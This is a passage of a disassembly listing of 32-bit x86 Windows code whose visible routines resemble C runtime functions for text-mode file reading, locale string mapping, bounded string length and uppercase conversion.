  406c97:	5f                   	pop    %edi
  406c98:	eb 0d                	jmp    0x406ca7
  406c9a:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  406ca1:	00 00 00 
  406ca4:	83 c8 ff             	or     $0xffffffff,%eax
  406ca7:	5e                   	pop    %esi
  406ca8:	5b                   	pop    %ebx
  406ca9:	c9                   	leave
  406caa:	c3                   	ret
  406cab:	55                   	push   %ebp
  406cac:	8b ec                	mov    %esp,%ebp
  406cae:	83 ec 0c             	sub    $0xc,%esp
  406cb1:	53                   	push   %ebx
  406cb2:	56                   	push   %esi
  406cb3:	8b 75 08             	mov    0x8(%ebp),%esi
  406cb6:	57                   	push   %edi
  406cb7:	3b 35 e0 c2 40 00    	cmp    0x40c2e0,%esi
  406cbd:	0f 83 c5 01 00 00    	jae    0x406e88
  406cc3:	8b c6                	mov    %esi,%eax
  406cc5:	83 e6 1f             	and    $0x1f,%esi
  406cc8:	c1 f8 05             	sar    $0x5,%eax
  406ccb:	c1 e6 03             	shl    $0x3,%esi
  406cce:	8d 1c 85 e0 c1 40 00 	lea    0x40c1e0(,%eax,4),%ebx
  406cd5:	8b 04 85 e0 c1 40 00 	mov    0x40c1e0(,%eax,4),%eax
  406cdc:	03 c6                	add    %esi,%eax
  406cde:	8a 50 04             	mov    0x4(%eax),%dl
  406ce1:	f6 c2 01             	test   $0x1,%dl
  406ce4:	0f 84 9e 01 00 00    	je     0x406e88
  406cea:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406cee:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406cf1:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406cf5:	8b cf                	mov    %edi,%ecx
  406cf7:	74 67                	je     0x406d60
  406cf9:	f6 c2 02             	test   $0x2,%dl
  406cfc:	75 62                	jne    0x406d60
  406cfe:	f6 c2 48             	test   $0x48,%dl
  406d01:	74 1d                	je     0x406d20
  406d03:	8a 40 05             	mov    0x5(%eax),%al
  406d06:	3c 0a                	cmp    $0xa,%al
  406d08:	74 16                	je     0x406d20
  406d0a:	ff 4d 10             	decl   0x10(%ebp)
  406d0d:	88 07                	mov    %al,(%edi)
  406d0f:	8b 03                	mov    (%ebx),%eax
  406d11:	8d 4f 01             	lea    0x1(%edi),%ecx
  406d14:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  406d1b:	c6 44 30 05 0a       	movb   $0xa,0x5(%eax,%esi,1)
  406d20:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406d23:	6a 00                	push   $0x0
  406d25:	50                   	push   %eax
  406d26:	8b 03                	mov    (%ebx),%eax
  406d28:	ff 75 10             	push   0x10(%ebp)
  406d2b:	51                   	push   %ecx
  406d2c:	ff 34 30             	push   (%eax,%esi,1)
  406d2f:	ff 15 30 80 40 00    	call   *0x408030
  406d35:	85 c0                	test   %eax,%eax
  406d37:	75 3a                	jne    0x406d73
  406d39:	ff 15 60 80 40 00    	call   *0x408060
  406d3f:	6a 05                	push   $0x5
  406d41:	59                   	pop    %ecx
  406d42:	3b c1                	cmp    %ecx,%eax
  406d44:	75 15                	jne    0x406d5b
  406d46:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  406d4d:	00 00 00 
  406d50:	89 0d e8 bd 40 00    	mov    %ecx,0x40bde8
  406d56:	e9 3e 01 00 00       	jmp    0x406e99
  406d5b:	83 f8 6d             	cmp    $0x6d,%eax
  406d5e:	75 07                	jne    0x406d67
  406d60:	33 c0                	xor    %eax,%eax
  406d62:	e9 35 01 00 00       	jmp    0x406e9c
  406d67:	50                   	push   %eax
  406d68:	e8 11 d7 ff ff       	call   0x40447e
  406d6d:	59                   	pop    %ecx
  406d6e:	e9 26 01 00 00       	jmp    0x406e99
  406d73:	8b 03                	mov    (%ebx),%eax
  406d75:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406d78:	01 55 f8             	add    %edx,-0x8(%ebp)
  406d7b:	8d 4c 30 04          	lea    0x4(%eax,%esi,1),%ecx
  406d7f:	8a 44 30 04          	mov    0x4(%eax,%esi,1),%al
  406d83:	a8 80                	test   $0x80,%al
  406d85:	0f 84 f8 00 00 00    	je     0x406e83
  406d8b:	85 d2                	test   %edx,%edx
  406d8d:	74 09                	je     0x406d98
  406d8f:	80 3f 0a             	cmpb   $0xa,(%edi)
  406d92:	75 04                	jne    0x406d98
  406d94:	0c 04                	or     $0x4,%al
  406d96:	eb 02                	jmp    0x406d9a
  406d98:	24 fb                	and    $0xfb,%al
  406d9a:	88 01                	mov    %al,(%ecx)
  406d9c:	8b 45 0c             	mov    0xc(%ebp),%eax
  406d9f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406da2:	89 45 10             	mov    %eax,0x10(%ebp)
  406da5:	03 c8                	add    %eax,%ecx
  406da7:	3b c1                	cmp    %ecx,%eax
  406da9:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406dac:	0f 83 cb 00 00 00    	jae    0x406e7d
  406db2:	8b 45 10             	mov    0x10(%ebp),%eax
  406db5:	8a 00                	mov    (%eax),%al
  406db7:	3c 1a                	cmp    $0x1a,%al
  406db9:	0f 84 ae 00 00 00    	je     0x406e6d
  406dbf:	3c 0d                	cmp    $0xd,%al
  406dc1:	74 0b                	je     0x406dce
  406dc3:	88 07                	mov    %al,(%edi)
  406dc5:	47                   	inc    %edi
  406dc6:	ff 45 10             	incl   0x10(%ebp)
  406dc9:	e9 91 00 00 00       	jmp    0x406e5f
  406dce:	49                   	dec    %ecx
  406dcf:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  406dd2:	73 18                	jae    0x406dec
  406dd4:	8b 45 10             	mov    0x10(%ebp),%eax
  406dd7:	40                   	inc    %eax
  406dd8:	80 38 0a             	cmpb   $0xa,(%eax)
  406ddb:	75 06                	jne    0x406de3
  406ddd:	83 45 10 02          	addl   $0x2,0x10(%ebp)
  406de1:	eb 5e                	jmp    0x406e41
  406de3:	c6 07 0d             	movb   $0xd,(%edi)
  406de6:	47                   	inc    %edi
  406de7:	89 45 10             	mov    %eax,0x10(%ebp)
  406dea:	eb 73                	jmp    0x406e5f
  406dec:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406def:	6a 00                	push   $0x0
  406df1:	50                   	push   %eax
  406df2:	ff 45 10             	incl   0x10(%ebp)
  406df5:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406df8:	6a 01                	push   $0x1
  406dfa:	50                   	push   %eax
  406dfb:	8b 03                	mov    (%ebx),%eax
  406dfd:	ff 34 30             	push   (%eax,%esi,1)
  406e00:	ff 15 30 80 40 00    	call   *0x408030
  406e06:	85 c0                	test   %eax,%eax
  406e08:	75 0a                	jne    0x406e14
  406e0a:	ff 15 60 80 40 00    	call   *0x408060
  406e10:	85 c0                	test   %eax,%eax
  406e12:	75 47                	jne    0x406e5b
  406e14:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  406e18:	74 41                	je     0x406e5b
  406e1a:	8b 03                	mov    (%ebx),%eax
  406e1c:	f6 44 30 04 48       	testb  $0x48,0x4(%eax,%esi,1)
  406e21:	74 13                	je     0x406e36
  406e23:	8a 45 ff             	mov    -0x1(%ebp),%al
  406e26:	3c 0a                	cmp    $0xa,%al
  406e28:	74 17                	je     0x406e41
  406e2a:	c6 07 0d             	movb   $0xd,(%edi)
  406e2d:	8b 0b                	mov    (%ebx),%ecx
  406e2f:	47                   	inc    %edi
  406e30:	88 44 31 05          	mov    %al,0x5(%ecx,%esi,1)
  406e34:	eb 29                	jmp    0x406e5f
  406e36:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  406e39:	75 0b                	jne    0x406e46
  406e3b:	80 7d ff 0a          	cmpb   $0xa,-0x1(%ebp)
  406e3f:	75 05                	jne    0x406e46
  406e41:	c6 07 0a             	movb   $0xa,(%edi)
  406e44:	eb 18                	jmp    0x406e5e
  406e46:	6a 01                	push   $0x1
  406e48:	6a ff                	push   $0xffffffff
  406e4a:	ff 75 08             	push   0x8(%ebp)
  406e4d:	e8 93 bf ff ff       	call   0x402de5
  406e52:	83 c4 0c             	add    $0xc,%esp
  406e55:	80 7d ff 0a          	cmpb   $0xa,-0x1(%ebp)
  406e59:	74 04                	je     0x406e5f
  406e5b:	c6 07 0d             	movb   $0xd,(%edi)
  406e5e:	47                   	inc    %edi
  406e5f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406e62:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  406e65:	0f 82 47 ff ff ff    	jb     0x406db2
  406e6b:	eb 10                	jmp    0x406e7d
  406e6d:	8b 03                	mov    (%ebx),%eax
  406e6f:	8d 74 30 04          	lea    0x4(%eax,%esi,1),%esi
  406e73:	8a 06                	mov    (%esi),%al
  406e75:	a8 40                	test   $0x40,%al
  406e77:	75 04                	jne    0x406e7d
  406e79:	0c 02                	or     $0x2,%al
  406e7b:	88 06                	mov    %al,(%esi)
  406e7d:	2b 7d 0c             	sub    0xc(%ebp),%edi
  406e80:	89 7d f8             	mov    %edi,-0x8(%ebp)
  406e83:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406e86:	eb 14                	jmp    0x406e9c
  406e88:	83 25 e8 bd 40 00 00 	andl   $0x0,0x40bde8
  406e8f:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  406e96:	00 00 00 
  406e99:	83 c8 ff             	or     $0xffffffff,%eax
  406e9c:	5f                   	pop    %edi
  406e9d:	5e                   	pop    %esi
  406e9e:	5b                   	pop    %ebx
  406e9f:	c9                   	leave
  406ea0:	c3                   	ret
  406ea1:	55                   	push   %ebp
  406ea2:	8b ec                	mov    %esp,%ebp
  406ea4:	6a ff                	push   $0xffffffff
  406ea6:	68 e8 84 40 00       	push   $0x4084e8
  406eab:	68 5c 3e 40 00       	push   $0x403e5c
  406eb0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406eb6:	50                   	push   %eax
  406eb7:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  406ebe:	83 ec 1c             	sub    $0x1c,%esp
  406ec1:	53                   	push   %ebx
  406ec2:	56                   	push   %esi
  406ec3:	57                   	push   %edi
  406ec4:	89 65 e8             	mov    %esp,-0x18(%ebp)
  406ec7:	33 ff                	xor    %edi,%edi
  406ec9:	39 3d 84 bf 40 00    	cmp    %edi,0x40bf84
  406ecf:	75 46                	jne    0x406f17
  406ed1:	57                   	push   %edi
  406ed2:	57                   	push   %edi
  406ed3:	6a 01                	push   $0x1
  406ed5:	5b                   	pop    %ebx
  406ed6:	53                   	push   %ebx
  406ed7:	68 e0 84 40 00       	push   $0x4084e0
  406edc:	be 00 01 00 00       	mov    $0x100,%esi
  406ee1:	56                   	push   %esi
  406ee2:	57                   	push   %edi
  406ee3:	ff 15 24 80 40 00    	call   *0x408024
  406ee9:	85 c0                	test   %eax,%eax
  406eeb:	74 08                	je     0x406ef5
  406eed:	89 1d 84 bf 40 00    	mov    %ebx,0x40bf84
  406ef3:	eb 22                	jmp    0x406f17
  406ef5:	57                   	push   %edi
  406ef6:	57                   	push   %edi
  406ef7:	53                   	push   %ebx
  406ef8:	68 dc 84 40 00       	push   $0x4084dc
  406efd:	56                   	push   %esi
  406efe:	57                   	push   %edi
  406eff:	ff 15 28 80 40 00    	call   *0x408028
  406f05:	85 c0                	test   %eax,%eax
  406f07:	0f 84 22 01 00 00    	je     0x40702f
  406f0d:	c7 05 84 bf 40 00 02 	movl   $0x2,0x40bf84
  406f14:	00 00 00 
  406f17:	39 7d 14             	cmp    %edi,0x14(%ebp)
  406f1a:	7e 10                	jle    0x406f2c
  406f1c:	ff 75 14             	push   0x14(%ebp)
  406f1f:	ff 75 10             	push   0x10(%ebp)
  406f22:	e8 9e 01 00 00       	call   0x4070c5
  406f27:	59                   	pop    %ecx
  406f28:	59                   	pop    %ecx
  406f29:	89 45 14             	mov    %eax,0x14(%ebp)
  406f2c:	a1 84 bf 40 00       	mov    0x40bf84,%eax
  406f31:	83 f8 02             	cmp    $0x2,%eax
  406f34:	75 1d                	jne    0x406f53
  406f36:	ff 75 1c             	push   0x1c(%ebp)
  406f39:	ff 75 18             	push   0x18(%ebp)
  406f3c:	ff 75 14             	push   0x14(%ebp)
  406f3f:	ff 75 10             	push   0x10(%ebp)
  406f42:	ff 75 0c             	push   0xc(%ebp)
  406f45:	ff 75 08             	push   0x8(%ebp)
  406f48:	ff 15 28 80 40 00    	call   *0x408028
  406f4e:	e9 de 00 00 00       	jmp    0x407031
  406f53:	83 f8 01             	cmp    $0x1,%eax
  406f56:	0f 85 d3 00 00 00    	jne    0x40702f
  406f5c:	39 7d 20             	cmp    %edi,0x20(%ebp)
  406f5f:	75 08                	jne    0x406f69
  406f61:	a1 78 bf 40 00       	mov    0x40bf78,%eax
  406f66:	89 45 20             	mov    %eax,0x20(%ebp)
  406f69:	57                   	push   %edi
  406f6a:	57                   	push   %edi
  406f6b:	ff 75 14             	push   0x14(%ebp)
  406f6e:	ff 75 10             	push   0x10(%ebp)
  406f71:	8b 45 24             	mov    0x24(%ebp),%eax
  406f74:	f7 d8                	neg    %eax
  406f76:	1b c0                	sbb    %eax,%eax
  406f78:	83 e0 08             	and    $0x8,%eax
  406f7b:	40                   	inc    %eax
  406f7c:	50                   	push   %eax
  406f7d:	ff 75 20             	push   0x20(%ebp)
  406f80:	ff 15 2c 80 40 00    	call   *0x40802c
  406f86:	8b d8                	mov    %eax,%ebx
  406f88:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  406f8b:	3b df                	cmp    %edi,%ebx
  406f8d:	0f 84 9c 00 00 00    	je     0x40702f
  406f93:	89 7d fc             	mov    %edi,-0x4(%ebp)
  406f96:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  406f99:	83 c0 03             	add    $0x3,%eax
  406f9c:	24 fc                	and    $0xfc,%al
  406f9e:	e8 3d f6 ff ff       	call   0x4065e0
  406fa3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  406fa6:	8b c4                	mov    %esp,%eax
  406fa8:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406fab:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  406faf:	eb 13                	jmp    0x406fc4
  406fb1:	6a 01                	push   $0x1
  406fb3:	58                   	pop    %eax
  406fb4:	c3                   	ret
  406fb5:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406fb8:	33 ff                	xor    %edi,%edi
  406fba:	89 7d dc             	mov    %edi,-0x24(%ebp)
  406fbd:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  406fc1:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  406fc4:	39 7d dc             	cmp    %edi,-0x24(%ebp)
  406fc7:	74 66                	je     0x40702f
  406fc9:	53                   	push   %ebx
  406fca:	ff 75 dc             	push   -0x24(%ebp)
  406fcd:	ff 75 14             	push   0x14(%ebp)
  406fd0:	ff 75 10             	push   0x10(%ebp)
  406fd3:	6a 01                	push   $0x1
  406fd5:	ff 75 20             	push   0x20(%ebp)
  406fd8:	ff 15 2c 80 40 00    	call   *0x40802c
  406fde:	85 c0                	test   %eax,%eax
  406fe0:	74 4d                	je     0x40702f
  406fe2:	57                   	push   %edi
  406fe3:	57                   	push   %edi
  406fe4:	53                   	push   %ebx
  406fe5:	ff 75 dc             	push   -0x24(%ebp)
  406fe8:	ff 75 0c             	push   0xc(%ebp)
  406feb:	ff 75 08             	push   0x8(%ebp)
  406fee:	ff 15 24 80 40 00    	call   *0x408024
  406ff4:	8b f0                	mov    %eax,%esi
  406ff6:	89 75 d8             	mov    %esi,-0x28(%ebp)
  406ff9:	3b f7                	cmp    %edi,%esi
  406ffb:	74 32                	je     0x40702f
  406ffd:	f6 45 0d 04          	testb  $0x4,0xd(%ebp)
  407001:	74 40                	je     0x407043
  407003:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  407006:	0f 84 b2 00 00 00    	je     0x4070be
  40700c:	3b 75 1c             	cmp    0x1c(%ebp),%esi
  40700f:	7f 1e                	jg     0x40702f
  407011:	ff 75 1c             	push   0x1c(%ebp)
  407014:	ff 75 18             	push   0x18(%ebp)
  407017:	53                   	push   %ebx
  407018:	ff 75 dc             	push   -0x24(%ebp)
  40701b:	ff 75 0c             	push   0xc(%ebp)
  40701e:	ff 75 08             	push   0x8(%ebp)
  407021:	ff 15 24 80 40 00    	call   *0x408024
  407027:	85 c0                	test   %eax,%eax
  407029:	0f 85 8f 00 00 00    	jne    0x4070be
  40702f:	33 c0                	xor    %eax,%eax
  407031:	8d 65 c8             	lea    -0x38(%ebp),%esp
  407034:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407037:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40703e:	5f                   	pop    %edi
  40703f:	5e                   	pop    %esi
  407040:	5b                   	pop    %ebx
  407041:	c9                   	leave
  407042:	c3                   	ret
  407043:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40704a:	8d 04 36             	lea    (%esi,%esi,1),%eax
  40704d:	83 c0 03             	add    $0x3,%eax
  407050:	24 fc                	and    $0xfc,%al
  407052:	e8 89 f5 ff ff       	call   0x4065e0
  407057:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40705a:	8b dc                	mov    %esp,%ebx
  40705c:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  40705f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  407063:	eb 12                	jmp    0x407077
  407065:	6a 01                	push   $0x1
  407067:	58                   	pop    %eax
  407068:	c3                   	ret
  407069:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40706c:	33 ff                	xor    %edi,%edi
  40706e:	33 db                	xor    %ebx,%ebx
  407070:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  407074:	8b 75 d8             	mov    -0x28(%ebp),%esi
  407077:	3b df                	cmp    %edi,%ebx
  407079:	74 b4                	je     0x40702f
  40707b:	56                   	push   %esi
  40707c:	53                   	push   %ebx
  40707d:	ff 75 e4             	push   -0x1c(%ebp)
  407080:	ff 75 dc             	push   -0x24(%ebp)
  407083:	ff 75 0c             	push   0xc(%ebp)
  407086:	ff 75 08             	push   0x8(%ebp)
  407089:	ff 15 24 80 40 00    	call   *0x408024
  40708f:	85 c0                	test   %eax,%eax
  407091:	74 9c                	je     0x40702f
  407093:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  407096:	57                   	push   %edi
  407097:	57                   	push   %edi
  407098:	75 04                	jne    0x40709e
  40709a:	57                   	push   %edi
  40709b:	57                   	push   %edi
  40709c:	eb 06                	jmp    0x4070a4
  40709e:	ff 75 1c             	push   0x1c(%ebp)
  4070a1:	ff 75 18             	push   0x18(%ebp)
  4070a4:	56                   	push   %esi
  4070a5:	53                   	push   %ebx
  4070a6:	68 20 02 00 00       	push   $0x220
  4070ab:	ff 75 20             	push   0x20(%ebp)
  4070ae:	ff 15 88 80 40 00    	call   *0x408088
  4070b4:	8b f0                	mov    %eax,%esi
  4070b6:	3b f7                	cmp    %edi,%esi
  4070b8:	0f 84 71 ff ff ff    	je     0x40702f
  4070be:	8b c6                	mov    %esi,%eax
  4070c0:	e9 6c ff ff ff       	jmp    0x407031
  4070c5:	8b 54 24 08          	mov    0x8(%esp),%edx
  4070c9:	8b 44 24 04          	mov    0x4(%esp),%eax
  4070cd:	85 d2                	test   %edx,%edx
  4070cf:	56                   	push   %esi
  4070d0:	8d 4a ff             	lea    -0x1(%edx),%ecx
  4070d3:	74 0d                	je     0x4070e2
  4070d5:	80 38 00             	cmpb   $0x0,(%eax)
  4070d8:	74 08                	je     0x4070e2
  4070da:	40                   	inc    %eax
  4070db:	8b f1                	mov    %ecx,%esi
  4070dd:	49                   	dec    %ecx
  4070de:	85 f6                	test   %esi,%esi
  4070e0:	75 f3                	jne    0x4070d5
  4070e2:	80 38 00             	cmpb   $0x0,(%eax)
  4070e5:	5e                   	pop    %esi
  4070e6:	75 05                	jne    0x4070ed
  4070e8:	2b 44 24 04          	sub    0x4(%esp),%eax
  4070ec:	c3                   	ret
  4070ed:	8b c2                	mov    %edx,%eax
  4070ef:	c3                   	ret
  4070f0:	55                   	push   %ebp
  4070f1:	8b ec                	mov    %esp,%ebp
  4070f3:	6a ff                	push   $0xffffffff
  4070f5:	68 00 85 40 00       	push   $0x408500
  4070fa:	68 5c 3e 40 00       	push   $0x403e5c
  4070ff:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407105:	50                   	push   %eax
  407106:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40710d:	83 ec 18             	sub    $0x18,%esp
  407110:	53                   	push   %ebx
  407111:	56                   	push   %esi
  407112:	57                   	push   %edi
  407113:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407116:	a1 88 bf 40 00       	mov    0x40bf88,%eax
  40711b:	33 db                	xor    %ebx,%ebx
  40711d:	3b c3                	cmp    %ebx,%eax
  40711f:	75 3e                	jne    0x40715f
  407121:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407124:	50                   	push   %eax
  407125:	6a 01                	push   $0x1
  407127:	5e                   	pop    %esi
  407128:	56                   	push   %esi
  407129:	68 e0 84 40 00       	push   $0x4084e0
  40712e:	56                   	push   %esi
  40712f:	ff 15 cc 80 40 00    	call   *0x4080cc
  407135:	85 c0                	test   %eax,%eax
  407137:	74 04                	je     0x40713d
  407139:	8b c6                	mov    %esi,%eax
  40713b:	eb 1d                	jmp    0x40715a
  40713d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407140:	50                   	push   %eax
  407141:	56                   	push   %esi
  407142:	68 dc 84 40 00       	push   $0x4084dc
  407147:	56                   	push   %esi
  407148:	53                   	push   %ebx
  407149:	ff 15 20 80 40 00    	call   *0x408020
  40714f:	85 c0                	test   %eax,%eax
  407151:	0f 84 ce 00 00 00    	je     0x407225
  407157:	6a 02                	push   $0x2
  407159:	58                   	pop    %eax
  40715a:	a3 88 bf 40 00       	mov    %eax,0x40bf88
  40715f:	83 f8 02             	cmp    $0x2,%eax
  407162:	75 24                	jne    0x407188
  407164:	8b 45 1c             	mov    0x1c(%ebp),%eax
  407167:	3b c3                	cmp    %ebx,%eax
  407169:	75 05                	jne    0x407170
  40716b:	a1 68 bf 40 00       	mov    0x40bf68,%eax
  407170:	ff 75 14             	push   0x14(%ebp)
  407173:	ff 75 10             	push   0x10(%ebp)
  407176:	ff 75 0c             	push   0xc(%ebp)
  407179:	ff 75 08             	push   0x8(%ebp)
  40717c:	50                   	push   %eax
  40717d:	ff 15 20 80 40 00    	call   *0x408020
  407183:	e9 9f 00 00 00       	jmp    0x407227
  407188:	83 f8 01             	cmp    $0x1,%eax
  40718b:	0f 85 94 00 00 00    	jne    0x407225
  407191:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  407194:	75 08                	jne    0x40719e
  407196:	a1 78 bf 40 00       	mov    0x40bf78,%eax
  40719b:	89 45 18             	mov    %eax,0x18(%ebp)
  40719e:	53                   	push   %ebx
  40719f:	53                   	push   %ebx
  4071a0:	ff 75 10             	push   0x10(%ebp)
  4071a3:	ff 75 0c             	push   0xc(%ebp)
  4071a6:	8b 45 20             	mov    0x20(%ebp),%eax
  4071a9:	f7 d8                	neg    %eax
  4071ab:	1b c0                	sbb    %eax,%eax
  4071ad:	83 e0 08             	and    $0x8,%eax
  4071b0:	40                   	inc    %eax
  4071b1:	50                   	push   %eax
  4071b2:	ff 75 18             	push   0x18(%ebp)
  4071b5:	ff 15 2c 80 40 00    	call   *0x40802c
  4071bb:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4071be:	3b c3                	cmp    %ebx,%eax
  4071c0:	74 63                	je     0x407225
  4071c2:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4071c5:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  4071c8:	8b c7                	mov    %edi,%eax
  4071ca:	83 c0 03             	add    $0x3,%eax
  4071cd:	24 fc                	and    $0xfc,%al
  4071cf:	e8 0c f4 ff ff       	call   0x4065e0
  4071d4:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4071d7:	8b f4                	mov    %esp,%esi
  4071d9:	89 75 dc             	mov    %esi,-0x24(%ebp)
  4071dc:	57                   	push   %edi
  4071dd:	53                   	push   %ebx
  4071de:	56                   	push   %esi
  4071df:	e8 ec f5 ff ff       	call   0x4067d0
  4071e4:	83 c4 0c             	add    $0xc,%esp
  4071e7:	eb 0b                	jmp    0x4071f4
  4071e9:	6a 01                	push   $0x1
  4071eb:	58                   	pop    %eax
  4071ec:	c3                   	ret
  4071ed:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4071f0:	33 db                	xor    %ebx,%ebx
  4071f2:	33 f6                	xor    %esi,%esi
  4071f4:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4071f8:	3b f3                	cmp    %ebx,%esi
  4071fa:	74 29                	je     0x407225
  4071fc:	ff 75 e0             	push   -0x20(%ebp)
  4071ff:	56                   	push   %esi
  407200:	ff 75 10             	push   0x10(%ebp)
  407203:	ff 75 0c             	push   0xc(%ebp)
  407206:	6a 01                	push   $0x1
  407208:	ff 75 18             	push   0x18(%ebp)
  40720b:	ff 15 2c 80 40 00    	call   *0x40802c
  407211:	3b c3                	cmp    %ebx,%eax
  407213:	74 10                	je     0x407225
  407215:	ff 75 14             	push   0x14(%ebp)
  407218:	50                   	push   %eax
  407219:	56                   	push   %esi
  40721a:	ff 75 08             	push   0x8(%ebp)
  40721d:	ff 15 cc 80 40 00    	call   *0x4080cc
  407223:	eb 02                	jmp    0x407227
  407225:	33 c0                	xor    %eax,%eax
  407227:	8d 65 cc             	lea    -0x34(%ebp),%esp
  40722a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40722d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407234:	5f                   	pop    %edi
  407235:	5e                   	pop    %esi
  407236:	5b                   	pop    %ebx
  407237:	c9                   	leave
  407238:	c3                   	ret
  407239:	55                   	push   %ebp
  40723a:	8b ec                	mov    %esp,%ebp
  40723c:	51                   	push   %ecx
  40723d:	83 3d 68 bf 40 00 00 	cmpl   $0x0,0x40bf68
  407244:	53                   	push   %ebx
  407245:	75 1d                	jne    0x407264
  407247:	8b 45 08             	mov    0x8(%ebp),%eax
  40724a:	83 f8 61             	cmp    $0x61,%eax
  40724d:	0f 8c af 00 00 00    	jl     0x407302
  407253:	83 f8 7a             	cmp    $0x7a,%eax
  407256:	0f 8f a6 00 00 00    	jg     0x407302
  40725c:	83 e8 20             	sub    $0x20,%eax
  40725f:	e9 9e 00 00 00       	jmp    0x407302
  407264:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407267:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  40726d:	7d 28                	jge    0x407297
  40726f:	83 3d 00 bb 40 00 01 	cmpl   $0x1,0x40bb00
  407276:	7e 0c                	jle    0x407284
  407278:	6a 02                	push   $0x2
  40727a:	53                   	push   %ebx
  40727b:	e8 85 00 00 00       	call   0x407305
  407280:	59                   	pop    %ecx
  407281:	59                   	pop    %ecx
  407282:	eb 0b                	jmp    0x40728f
  407284:	a1 58 96 40 00       	mov    0x409658,%eax
  407289:	8a 04 58             	mov    (%eax,%ebx,2),%al
  40728c:	83 e0 02             	and    $0x2,%eax
  40728f:	85 c0                	test   %eax,%eax
  407291:	75 04                	jne    0x407297
  407293:	8b c3                	mov    %ebx,%eax
  407295:	eb 6b                	jmp    0x407302
  407297:	8b 15 58 96 40 00    	mov    0x409658,%edx
  40729d:	8b c3                	mov    %ebx,%eax
  40729f:	c1 f8 08             	sar    $0x8,%eax
  4072a2:	0f b6 c8             	movzbl %al,%ecx
  4072a5:	f6 44 4a 01 80       	testb  $0x80,0x1(%edx,%ecx,2)
  4072aa:	74 0e                	je     0x4072ba
  4072ac:	80 65 0a 00          	andb   $0x0,0xa(%ebp)
  4072b0:	88 45 08             	mov    %al,0x8(%ebp)
  4072b3:	88 5d 09             	mov    %bl,0x9(%ebp)
  4072b6:	6a 02                	push   $0x2
  4072b8:	eb 09                	jmp    0x4072c3
  4072ba:	80 65 09 00          	andb   $0x0,0x9(%ebp)
  4072be:	88 5d 08             	mov    %bl,0x8(%ebp)
  4072c1:	6a 01                	push   $0x1
  4072c3:	58                   	pop    %eax
  4072c4:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4072c7:	6a 01                	push   $0x1
  4072c9:	6a 00                	push   $0x0
  4072cb:	6a 03                	push   $0x3
  4072cd:	51                   	push   %ecx
  4072ce:	50                   	push   %eax
  4072cf:	8d 45 08             	lea    0x8(%ebp),%eax
  4072d2:	50                   	push   %eax
  4072d3:	68 00 02 00 00       	push   $0x200
  4072d8:	ff 35 68 bf 40 00    	push   0x40bf68
  4072de:	e8 be fb ff ff       	call   0x406ea1
  4072e3:	83 c4 20             	add    $0x20,%esp
  4072e6:	85 c0                	test   %eax,%eax
  4072e8:	74 a9                	je     0x407293
  4072ea:	83 f8 01             	cmp    $0x1,%eax
  4072ed:	75 06                	jne    0x4072f5
  4072ef:	0f b6 45 fc          	movzbl -0x4(%ebp),%eax
  4072f3:	eb 0d                	jmp    0x407302
  4072f5:	0f b6 45 fd          	movzbl -0x3(%ebp),%eax
  4072f9:	0f b6 4d fc          	movzbl -0x4(%ebp),%ecx
  4072fd:	c1 e0 08             	shl    $0x8,%eax
  407300:	0b c1                	or     %ecx,%eax
  407302:	5b                   	pop    %ebx
  407303:	c9                   	leave
  407304:	c3                   	ret
  407305:	55                   	push   %ebp
  407306:	8b ec                	mov    %esp,%ebp
  407308:	51                   	push   %ecx
  407309:	8b 45 08             	mov    0x8(%ebp),%eax
